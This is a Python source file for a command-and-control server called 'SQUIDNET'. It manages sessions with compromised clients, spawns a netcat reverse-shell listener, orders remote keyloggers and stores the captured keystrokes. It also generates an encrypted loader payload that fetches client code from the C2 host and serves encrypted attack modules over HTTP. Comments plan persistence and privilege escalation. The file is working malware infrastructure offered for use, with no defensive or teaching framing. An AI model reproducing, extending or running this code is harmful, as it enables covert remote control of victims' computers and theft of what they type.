


import psutil
import signal
import threading, socket, colorama, helpers,session, socketserver,select, subprocess, os, time,secrets
import random
import logging
import encryption


from pyfiglet import figlet_format

import json

def read_config(config_filepath):
    try:
        with open(config_filepath, 'r') as f:
            config_data = json.load(f)
            return config_data
    except FileNotFoundError:
        helpers.show(f"Error: Config file not found at {config_filepath}",colour="RED")
        return None
    except json.JSONDecodeError:
        helpers.show(f"Error: Invalid JSON format in {config_filepath}",colour="RED")
        return None




class server():
    def __init__(self, host='localhost', port = 5000, db='memory'):
        self.socket = self._socket(port)
        self.sessions = []
        self.current_session = None  
        self.host = host
        self.port = port
        self.db = db
        self.app = None
        self.config = read_config("config.json")
        self.url = f"http://{self.config.get("host_ip")}:5001"
        self.key = self.generate_key()
        self.modules = []
        
        for filename in os.listdir(os.path.join(os.getcwd(), 'modules')):
            self.modules.append(filename[:-3])
        
        self.threads = []
        #TODO: dockerfile
        #TODO: list all sessions
        #TODO: get session info (Operating system etc)
        #TODO: compile payloads automatically for different operating systems
        #TODO: write windows payloads
        #TODO: DATABASE
        #TODO: persistence payload
        #TODO: Priv escalation
        self.commands = {

            'hello' : {
                'method': self._hello,
                'use' : 'hello',
                'desc' : 'Says hello!'
            },

            'quit' : {
                'method': self._quit,
                'use' : 'quit',
                'desc' : 'Closes the server and stops the program.'
            },

            'commands' : {
                'method': self._commands,
                'use' : 'commands',
                'desc' : 'Lists all commands.'
            },

            'help' : {
                'method' : self._help,
                'use' : 'help <command>',
                'desc' : 'Gives the description and usage of a command.' 
            },
            
            'session' : {
                'method' : self._sesh,
                'use' : 'session <session_id>',
                'desc' : 'Changes the current session to the session with the specified ID.'
            },
            'shell' : {
                'method' : self._shell,
                'use' : 'shell',
                'desc' : 'Spawns a reverse shell to the current session'
            },
            'test-con' : {
                'method' : self._test_con,
                'use' : 'test-con',
                'desc' : 'tests connection to session.'
            },
            'payload' : {
                'method' : self._payload,
                'use' : 'payload ',
                'desc' : 'generate a payload'
            },
            'modules': {
                'method' : self._modules,
                'use' : 'modules',
                'desc' : 'show list of modules'
            },
            'keylogger': {
                'method' : self._keylogger,
                'use' : 'keylogger',
                'desc' : 'run a keylogger on the current session'
            },


        
        }

    def _help(self, command):
        '''list the command and its usage'''
        if (command in self.commands):
            out = """
            Usage: {0}
            Description: {1}
            """.format(self.commands[command]['use'],self.commands[command]['desc'])
        else:
            raise Exception("Unknown command: \"{}\"".format(command))
        return out
    
    def _modules(self):
        out = "List of Modules: | "
        for mod in self.modules:
            out += mod + " | "
        return out
    
    @helpers.make_threaded
    def keylog_listener(self):
        helpers.show("LISTENING FOR KEYSTOKES ON PORT 5004 OUTPUT SAVED TO output/keylog.txt",colour="BLUE", style="BRIGHT", end="\n->")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Bind the socket to the host and port
            s.bind(("127.0.0.1", 5004))
            s.listen()
            while True and not globals()["close"]:
                # Listen for incoming connections
                s.settimeout(0.1)
                # Accept a connection
            
                try:
                    conn, addr = s.accept()
                    with conn:
                        
                        
                            # Receive data from the client
                            while True:
                                data = conn.recv(1024)  # Receive up to 1024 bytes This is a test wooot
                                if not data:
                                    break  # No more data, connection closed
                                # Process the received data (e.g., print it) 
                                # Decode received bytes to string, then append to file
                                decoded_data = data.decode("utf-8", errors="replace")
                                with open("output/keylog.txt", "a", encoding="utf-8")  as output_file:
                                    output_file.write(decoded_data)
                except socket.timeout:
                    pass   
        helpers.show("STOPPING KEYLOGGING SOCKET", colour="RED", style="BRIGHT", end="\n")   
        


    def _keylogger(self):
        self.current_session.send_instruction("keylogger")
        self.threads.append(self.keylog_listener())




        
    @helpers.make_threaded
    def get_client_connection(self):
        '''wait for a client to connect on a different thread and create a new session'''
        while True and not globals()['close']:
            self.socket.settimeout(0.1)
            try:
                connection, ip = self.socket.accept()
                helpers.show("\nRECEIVED CONNECTION REQUEST FROM: {}".format(ip), colour="GREEN", end="\n->")
                client_ip = ip[0]

                #check for existing session
                existing_session = next((s for s in self.sessions if s.client_address == client_ip), None)
                if existing_session:
                    helpers.show(f"CLIENT {client_ip} CONNECTED AGAIN. SESSION ID {existing_session.id}", colour="YELLOW", end="\n->")
                else:
                    # Ensure the session ID is unique
                    while True:
                        session_id = random.randint(1000, 9999)
                        if not any(s.id == session_id for s in self.sessions):
                                break
                    
                    new_session = session.Session(connection, session_id)
                    if new_session.check_connection():
                        helpers.show("CONNECTION SUCCESSFUL", colour="GREEN", style="BRIGHT", end="\n->")
                        
                        self.sessions.append(new_session)
                        helpers.show("CREATED NEW SESSION WITH ID " + str(session_id), colour="BLUE", style="BRIGHT", end="\n->")

                        connection.sendall(self.key)
                        
                    else:
                        helpers.show("CONNECTION FAILED", colour="RED", style="BRIGHT", end="\n->")
            except socket.timeout:
                pass       
                
        helpers.show("STOPPING LISTENING SOCKET", colour="RED", style="BRIGHT", end="\n")   
            
    def set_session(self, session):
        self.current_session = session
        return
    
    def start_shell(self):

        #send message
        self.current_session.send_instruction("shell")

        #spawn a listener on port 5002
        helpers.show("SPAWNING LISTENER SHELL", colour="BLUE", style="BRIGHT", end="\n")   
        # Command to execute
        os.system('nc -lvnp 5002')

        
    def _payload(self,):
        
        payload_path = os.path.join(os.getcwd(), 'base-loader/loader.py')
        url = self.url + "/client.py"
        helpers.modify_script(payload_path,os.path.join(os.getcwd(), 'payload/payload.py'),encryption.encrypt(url.encode(),self.key),self.key)
          

        
        helpers.show(f"PAYLOAD FILE WRITTEN TO PAYLOAD DIRECTORY", colour='GREEN', style='BRIGHT', end='\n->')

    
    def _shell(self):
        #spawn a reverse shell
        self.start_shell()

        # Clean up port 5002 after shell exits
        os.system("pkill -f 'nc -lvnp 5002'")  
        
    def _test_con(self):
        if self.current_session.check_connection():
            helpers.show("SESSION IS CONNECTED", colour='GREEN', style='BRIGHT', end='')
        else:
            helpers.show("SESSION IS NOT CONNECTED", colour='RED', style='BRIGHT', end='')

    def _sesh(self, ID):
        '''Changes the current session to the session with the specified ID.'''
        try:
            ID = int(ID)
            session = next((s for s in self.sessions if s.id == ID), None)
            if session:
                self.set_session(session)
                helpers.show(f"SESSION ID CHANGED TO: {ID}", colour='GREEN', style='BRIGHT', end='')
            else:
                helpers.show("SESSION ID NOT FOUND", colour='RED', style='BRIGHT', end='')
        except ValueError:
            helpers.show("INVALID SESSION ID:", colour='RED', style='BRIGHT', end='')
        return   
    #TODO:implement remove session

    def _commands(self):
        '''list the commands'''
        out = "List of Commands: | "
        for cmd in self.commands.keys():
            out += cmd + " | "
        return out
    
    

    def _hello(self):
        return "hello!"
              
    def _socket(self,port):
        '''creates a socket for the server'''
        sock =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('localhost',port))
        sock.listen(100)
        return sock
    
    def _quit(self):
        '''closes the program'''
        globals()['close'] = True
        return

    def generate_key(self):
        return secrets.token_bytes(32)

    def run(self):
        #listen for incoming connections
        self.threads.append(self.get_client_connection())
        while True and not globals()['close']:
            cmd_string = input(getattr(colorama.Fore, 'GREEN') + "->" + colorama.Style.RESET_ALL)
            cmd, x, action = cmd_string.partition(' ')
            if cmd in self.commands:
                method = self.commands[cmd]['method']
                if callable(method):
                    try:
                        out = method(action) if len(action) else method()
                        if out == None:
                            out = ''
                        c = 'BLUE'
                    except Exception as e:
                        out = str(e)
                        c = 'RED'
                    helpers.show(out, colour = c,end="\n")
                
            else:
                helpers.show("INVALID COMMAND:",colour='RED', style='BRIGHT',end='')
                helpers.show("use 'commands' for list of commands", colour="BLUE")
        for t in self.threads:
            t.join()
          
if __name__ == "__main__":       

    #print title

    helpers.show(
        """
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⢀⡤⠞⠉⠙⠲⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠞⠉⠀⠀⠀⠀⠀⠀⠈⠙⠲⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠋⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣄⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣶⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⣰⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⢻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⢹⠘⣄⠀⠀⠀⠀⠀⠀⠀⠀⣠⠔⠉⠘⡄⠀⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠀⠀⣾⠀⠈⢳⣄⡀⠀⠀⣀⣐⠊⠁⠀⠀⠀⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⢸⡟⠀⠀⠀⠈⠙⢷⡾⠉⠀⠀⠀⠀⠀⣀⡇⠀⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⢸⡇⠀⠀⠀⣴⡄⠀⠀⢠⣄⠀⠀⠀⠀⡟⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠈⣇⠀⠀⠀⠈⠀⢀⡀⠈⠁⠀⠀⠀⣰⠇⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⡀⠀⠘⠷⣄⣀⣠⠴⠋⠙⠦⣄⣀⡤⠞⠁⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣦⣤⣤⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⡤⠴⠒⠒⠦⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢀⠞⠀⠀⠀⠀⢀⡟⠀⠀⢸⡅⢹⠁⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⡴⠋⠀⠀⠀⠀⠀⠀⠈⠑⠢⣄⣀⣀⣀⡤⠖⠉⢀⡴⠋⠀⠀⠀⠀⢠⡟⠀⠀⠀⢸⡇⢸⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣾⣀⡠⠴⠒⠒⠶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⢀⡴⢻⡇⠀⠀⠀⢸⠃⢸⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⣀⡤⠚⠉⠀⠀⠀⠀⢀⡴⠟⠀⢸⡇⠀⠀⠀⢸⠀⢸⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣹⠖⠋⠁⠀⠀⠀⠀⢀⣠⣴⠋⠀⠀⠀⢸⡇⠀⠀⠀⢸⠀⢸⠀⠀⠸⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠊⠀⠀⠀⠀⣀⡤⠴⠚⢉⡽⠁⠀⠀⠀⣰⢿⠁⠀⠀⠀⡏⠀⢸⡀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡼⠁⠀⢀⡠⠖⠋⠁⠀⠀⣰⠋⠀⠀⠀⢀⡼⠁⡞⠀⠀⠀⢰⠇⠀⣾⣧⠀⠀⠀⠀⠉⠓⠒⠒⠲⠶⠤⠤⢤⣀⠀
⠀⠀⠀⠀⠀⠀⠀⢰⠃⠀⢠⠞⠁⠀⠀⠀⠀⡼⠁⠀⠀⢀⡴⠋⠀⣸⠃⠀⠀⢀⡟⠀⢀⡇⠈⠳⣄⡀⠀⠀⠀⠀⢀⣀⣀⣀⣀⡀⠈⣷
⠀⠀⠀⠀⠀⠀⠀⢸⠀⣰⠋⠀⠀⠀⠀⠀⣸⠁⠀⢀⡴⠋⠀⠀⣰⠃⠀⠀⢀⡾⠁⠀⢸⠁⠀⠀⠀⠉⠉⠉⠉⠉⠉⠀⠀⠀⠈⠉⠉⠁
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⢠⠇⠀⣠⠋⠀⠀⢀⡜⠁⠀⠀⢠⡾⡇⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⢰⠃⠀⢀⡰⠋⠀⠀⢀⡴⠋⠀⢻⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣤⠏⠀⣠⠊⠀⠀⣠⠴⠋⠀⠀⠀⠈⢧⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣇⣠⠴⠚⠁⠀⠀⠀⠀⠀⠀⠈⢧⡀⠈⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣦⣀⣳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

""",colour='BLUE', style='BRIGHT',end='')
    helpers.show(figlet_format('SQUIDNET', font='slant'),colour='BLUE', style='BRIGHT',end='')

    #Initialize C2 Server
    try:
        globals()['CommandServer'] = server()


        config = read_config("config.json")
        modules_dir = os.path.join(os.getcwd(), 'modules')
        new_ip = config.get("host_ip")
        #updating module code
        print(new_ip)
        print("update modules code")
        for filename in os.listdir(modules_dir):
            if filename.endswith(".py"):
                filepath = os.path.join(modules_dir, filename)
                helpers.replace_host_line(filepath, new_ip)


        helpers.show("ENCRYPTING MODULE PAYLOADS", colour='BLUE', style='BRIGHT', end='\n')
        encrypted_dir = os.path.join(os.getcwd(), 'encrypted')

        
        
        for filename in os.listdir(modules_dir):
            if filename.endswith(".py"):
                
                with open(os.path.join(modules_dir, filename), "rb") as f:
                    plaintext = f.read()
                    ciphertext = encryption.encrypt(plaintext, globals()['CommandServer'].key)
                    output_filepath = os.path.join(encrypted_dir, filename)
                    with open(output_filepath, "wb") as f_out:
                            f_out.write(ciphertext)



        #host the module files
        helpers.show("STARTING MODULE HOSTING", colour='BLUE', style='BRIGHT', end='\n')
        globals()['module_host'] = subprocess.Popen('python -m http.server 5001',stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=os.getcwd() + '/encrypted',shell=True)
        globals()['close'] = False

        globals()['module_host'] = subprocess.Popen('python -m http.server 5003', stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd='/usr/local/lib/python3.12/site-packages',shell=True)

        helpers.show("STARTING COMMAND SERVER", colour='BLUE', style='BRIGHT', end='\n')
        globals()['CommandServer'].run()

    except KeyboardInterrupt:
        # Graceful shutdown on Ctrl + C
        helpers.show("\nKeyboard interrupt detected, shutting down...", "RED")
        globals()['CommandServer']._quit()  # sets close = True so threads can exit
        # Join threads if needed:
        for t in globals()['CommandServer'].threads:
            t.join()

    finally:

        #close the module host    
        process = psutil.Process(globals()['module_host'].pid)
        for proc in process.children(recursive=True):
            proc.kill()
        process.kill()
